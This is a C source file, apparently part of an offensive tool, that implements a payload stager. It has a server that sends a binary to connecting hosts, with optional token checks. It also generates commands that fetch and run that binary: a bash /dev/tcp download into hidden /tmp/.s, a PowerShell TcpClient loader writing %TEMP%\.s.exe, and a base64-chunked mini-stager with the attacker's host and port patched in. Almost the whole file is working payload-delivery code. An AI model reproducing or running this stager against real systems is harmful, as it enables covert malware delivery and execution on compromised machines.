#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifndef _WIN32
#include <unistd.h>
#endif

#include "od_stager.h"
#include "od_socket.h"
#include "od_log.h"

/* ── helpers ──────────────────────────────────────────────────── */

static int stager_recv_exact(socket_t fd, void *buf, size_t n) {
    size_t done = 0;
    while (done < n) {
        int r = recv(fd, (char *)buf + done, (int)(n - done), 0);
        if (r <= 0) return -1;
        done += (size_t)r;
    }
    return 0;
}

static int stager_send_all(socket_t fd, const void *buf, size_t n) {
    size_t done = 0;
    while (done < n) {
        int w = send(fd, (const char *)buf + done, (int)(n - done), 0);
        if (w <= 0) return -1;
        done += (size_t)w;
    }
    return 0;
}

static bool stager_ct_compare(const char *a, const char *b, size_t len) {
    volatile unsigned char diff = 0;
    size_t i;
    for (i = 0; i < len; i++) {
        diff |= (unsigned char)((unsigned char)a[i] ^ (unsigned char)b[i]);
    }
    return diff == 0;
}

static uint8_t *stager_read_file(const char *path, size_t *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    if (sz <= 0 || (size_t)sz > OD_STAGER_MAX_BINARY) {
        fclose(f);
        return NULL;
    }
    fseek(f, 0, SEEK_SET);
    uint8_t *buf = (uint8_t *)malloc((size_t)sz);
    if (!buf) { fclose(f); return NULL; }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        free(buf);
        fclose(f);
        return NULL;
    }
    fclose(f);
    *out_len = (size_t)sz;
    return buf;
}

static const char BASE64_TABLE[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char *stager_base64_encode(const uint8_t *data, size_t len, size_t *out_len) {
    size_t olen = 4 * ((len + 2) / 3);
    char *out = (char *)malloc(olen + 1);
    if (!out) return NULL;
    size_t i, j;
    for (i = 0, j = 0; i + 2 < len; i += 3) {
        uint32_t v = ((uint32_t)data[i] << 16) | ((uint32_t)data[i+1] << 8) | data[i+2];
        out[j++] = BASE64_TABLE[(v >> 18) & 0x3f];
        out[j++] = BASE64_TABLE[(v >> 12) & 0x3f];
        out[j++] = BASE64_TABLE[(v >>  6) & 0x3f];
        out[j++] = BASE64_TABLE[v & 0x3f];
    }
    if (i < len) {
        uint32_t v = (uint32_t)data[i] << 16;
        if (i + 1 < len) v |= (uint32_t)data[i+1] << 8;
        out[j++] = BASE64_TABLE[(v >> 18) & 0x3f];
        out[j++] = BASE64_TABLE[(v >> 12) & 0x3f];
        out[j++] = (i + 1 < len) ? BASE64_TABLE[(v >> 6) & 0x3f] : '=';
        out[j++] = '=';
    }
    out[j] = '\0';
    *out_len = j;
    return out;
}

/* ── stager-server ───────────────────────────────────────────── */

static int stager_handle_raw(socket_t cfd, const uint8_t *binary, size_t binary_len,
                             bool verbose) {
    if (stager_send_all(cfd, binary, binary_len) < 0) return -1;
    if (verbose) od_log_info("stager: sent binary raw (%zu bytes)", binary_len);
    return 0;
}

static int stager_handle_authed(socket_t cfd, const uint8_t *binary, size_t binary_len,
                                const char *token, const char *args_str, bool verbose) {
    uint32_t net32;
    uint8_t hdr[8];

    if (stager_recv_exact(cfd, hdr, 8) < 0) {
        od_log_warn("stager: failed to read handshake");
        return -1;
    }
    uint32_t magic = ntohl(*(uint32_t *)hdr);
    uint32_t tlen  = ntohl(*(uint32_t *)(hdr + 4));

    if (magic != OD_STAGER_MAGIC) {
        od_log_warn("stager: bad magic 0x%08x", magic);
        return -1;
    }
    if (tlen > OD_STAGER_MAX_TOKEN) {
        od_log_warn("stager: token too long (%u)", tlen);
        return -1;
    }

    char client_token[OD_STAGER_MAX_TOKEN + 1];
    memset(client_token, 0, sizeof(client_token));
    if (stager_recv_exact(cfd, client_token, tlen) < 0) {
        od_log_warn("stager: failed to read token");
        return -1;
    }

    size_t token_len = strlen(token);
    uint8_t status;
    if (tlen != (uint32_t)token_len ||
        !stager_ct_compare(client_token, token, token_len)) {
        od_log_warn("stager: auth failed");
        status = OD_STAGER_AUTH_FAIL;
        stager_send_all(cfd, &status, 1);
        return -1;
    }

    if (verbose) od_log_info("stager: auth ok");
    status = OD_STAGER_AUTH_OK;
    if (stager_send_all(cfd, &status, 1) < 0) return -1;

    net32 = htonl((uint32_t)binary_len);
    if (stager_send_all(cfd, &net32, 4) < 0) return -1;
    if (stager_send_all(cfd, binary, binary_len) < 0) return -1;
    if (verbose) od_log_info("stager: sent binary (%zu bytes)", binary_len);

    char args_payload[OD_STAGER_MAX_ARGS + 1];
    size_t args_payload_len = 0;
    memset(args_payload, 0, sizeof(args_payload));

    if (args_str && args_str[0]) {
        size_t slen = strlen(args_str);
        if (slen < sizeof(args_payload)) {
            memcpy(args_payload, args_str, slen);
            size_t i;
            for (i = 0; i < slen; i++) {
                if (args_payload[i] == ' ') args_payload[i] = '\0';
            }
            args_payload[slen] = '\0';
            args_payload_len = slen + 1;
        }
    }

    net32 = htonl((uint32_t)args_payload_len);
    if (stager_send_all(cfd, &net32, 4) < 0) return -1;
    if (args_payload_len > 0) {
        if (stager_send_all(cfd, args_payload, args_payload_len) < 0) return -1;
    }

    if (verbose) od_log_info("stager: transfer complete");
    return 0;
}

int od_run_stager_server(const endpoint_t *listen_ep,
                         const char *binary_path,
                         const char *token,
                         const char *args_str,
                         bool single_use, bool verbose) {
    size_t binary_len = 0;
    uint8_t *binary = stager_read_file(binary_path, &binary_len);
    if (!binary) {
        od_log_error("stager-server: cannot read binary '%s'", binary_path);
        return 1;
    }

    socket_t lfd = od_open_listener(listen_ep);
    if (lfd == OD_SOCK_INVALID) {
        free(binary);
        return 1;
    }

    const char *mode = token ? "authenticated" : "raw (no auth)";
    od_log_info("stager-server: mode=%s binary=%s (%zu bytes)", mode, binary_path, binary_len);
    od_log_info("stager-server: listening on %s:%u", listen_ep->host, (unsigned)listen_ep->port);

    for (;;) {
        char peer_host[128];
        uint16_t peer_port = 0;
        socket_t cfd = od_accept_with_peer(lfd, peer_host, sizeof(peer_host), &peer_port);
        if (cfd == OD_SOCK_INVALID) continue;

        od_log_info("stager-server: connection from %s:%u", peer_host, (unsigned)peer_port);

        int ok;
        if (token) {
            ok = stager_handle_authed(cfd, binary, binary_len, token, args_str, verbose);
        } else {
            ok = stager_handle_raw(cfd, binary, binary_len, verbose);
        }
        od_socket_close(cfd);

        if (ok == 0 && single_use) {
            od_log_info("stager-server: single-use, exiting");
            break;
        }
    }

    od_socket_close(lfd);
    free(binary);
    return 0;
}

/* ── stager generate: oneliner ───────────────────────────────── */

static void generate_oneliner_linux(const char *host, uint16_t port, const char *run_args) {
    printf("bash -c 'exec 3<>/dev/tcp/%s/%u;cat<&3>/tmp/.s;chmod +x /tmp/.s;/tmp/.s",
           host, (unsigned)port);
    if (run_args && run_args[0]) printf(" %s", run_args);
    printf("'\n");
}

static void generate_oneliner_windows(const char *host, uint16_t port, const char *run_args) {
    printf("$c=New-Object Net.Sockets.TcpClient(\"%s\",%u);"
           "$s=$c.GetStream();$m=New-Object IO.MemoryStream;"
           "$b=New-Object byte[] 65536;"
           "while(($n=$s.Read($b,0,$b.Length)) -gt 0){$m.Write($b,0,$n)};"
           "$c.Close();"
           "$p=\"$env:TEMP\\.s.exe\";"
           "[IO.File]::WriteAllBytes($p,$m.ToArray());"
           "& $p",
           host, (unsigned)port);
    if (run_args && run_args[0]) printf(" %s", run_args);
    printf("\n");
}

/* ── stager generate: base64 mini-stager ─────────────────────── */

#include "od_stager_payload_linux_x64.h"

#define STAGER_CHUNK_CHARS 1512

#define SENTINEL_HOST  "@@STAGER_HOST@@"
#define SENTINEL_PORT  "@@STAGER_PORT@@"
#define SENTINEL_TOKEN "@@STAGER_TOKEN@"

static uint8_t *stager_find_sentinel(uint8_t *bin, size_t bin_len,
                                     const char *sentinel) {
    size_t slen = strlen(sentinel);
    if (slen > bin_len) return NULL;
    size_t i;
    for (i = 0; i <= bin_len - slen; i++) {
        if (memcmp(bin + i, sentinel, slen) == 0) return bin + i;
    }
    return NULL;
}

static void stager_output_b64_chunked(const char *b64, size_t b64_len,
                                      const char *os_name) {
    size_t chunks = (b64_len + STAGER_CHUNK_CHARS - 1) / STAGER_CHUNK_CHARS;

    if (strcmp(os_name, "linux") == 0) {
        size_t off;
        for (off = 0; off < b64_len; off += STAGER_CHUNK_CHARS) {
            size_t n = b64_len - off;
            if (n > STAGER_CHUNK_CHARS) n = STAGER_CHUNK_CHARS;
            printf("echo -n '");
            fwrite(b64 + off, 1, n, stdout);
            printf("'>>/tmp/.b\n");
        }
        printf("base64 -d /tmp/.b>/tmp/.s;rm /tmp/.b;chmod +x /tmp/.s;/tmp/.s\n");
    } else {
        size_t off;
        for (off = 0; off < b64_len; off += STAGER_CHUNK_CHARS) {
            size_t n = b64_len - off;
            if (n > STAGER_CHUNK_CHARS) n = STAGER_CHUNK_CHARS;
            if (off == 0) {
                printf("$b='");
            } else {
                printf("$b+='");
            }
            fwrite(b64 + off, 1, n, stdout);
            printf("'\n");
        }
        printf("[IO.File]::WriteAllBytes(\"$env:TEMP\\.s.exe\","
               "[Convert]::FromBase64String($b));& \"$env:TEMP\\.s.exe\"\n");
    }

    od_log_info("stager: base64 mini-stager %zu chars in %zu chunks (os=%s)",
                b64_len, chunks, os_name);
}

static int generate_base64_ministager(const char *host, uint16_t port,
                                      const char *token,
                                      const char *os_name) {
    if (strcmp(os_name, "linux") != 0) {
        od_log_error("stager: base64 mini-stager only supports linux for now");
        return 1;
    }

    size_t payload_len = (size_t)stager_linux_x64_len;
    uint8_t *payload = (uint8_t *)malloc(payload_len);
    if (!payload) {
        od_log_error("stager: malloc failed");
        return 1;
    }
    memcpy(payload, stager_linux_x64, payload_len);

    uint8_t *p;
    p = stager_find_sentinel(payload, payload_len, SENTINEL_HOST);
    if (!p) { free(payload); od_log_error("stager: host sentinel not found"); return 1; }
    memset(p, 0, 256);
    memcpy(p, host, strlen(host));

    p = stager_find_sentinel(payload, payload_len, SENTINEL_PORT);
    if (!p) { free(payload); od_log_error("stager: port sentinel not found"); return 1; }
    memset(p, 0, 16);
    char port_str[16];
    snprintf(port_str, sizeof(port_str), "%u", (unsigned)port);
    memcpy(p, port_str, strlen(port_str));

    p = stager_find_sentinel(payload, payload_len, SENTINEL_TOKEN);
    if (!p) { free(payload); od_log_error("stager: token sentinel not found"); return 1; }
    memset(p, 0, 256);
    memcpy(p, token, strlen(token));

    size_t b64_len = 0;
    char *b64 = stager_base64_encode(payload, payload_len, &b64_len);
    free(payload);
    if (!b64) {
        od_log_error("stager: base64 encode failed");
        return 1;
    }

    stager_output_b64_chunked(b64, b64_len, os_name);
    free(b64);
    return 0;
}

/* ── public entry point ──────────────────────────────────────── */

int od_run_stager_generate(const char *connect_host, uint16_t connect_port,
                           const char *token,
                           const char *os_name,
                           const char *format,
                           const char *run_args) {
    if (strcmp(format, "oneliner") == 0) {
        if (strcmp(os_name, "linux") == 0) {
            generate_oneliner_linux(connect_host, connect_port, run_args);
        } else {
            generate_oneliner_windows(connect_host, connect_port, run_args);
        }
        return 0;
    }

    return generate_base64_ministager(connect_host, connect_port, token, os_name);
}
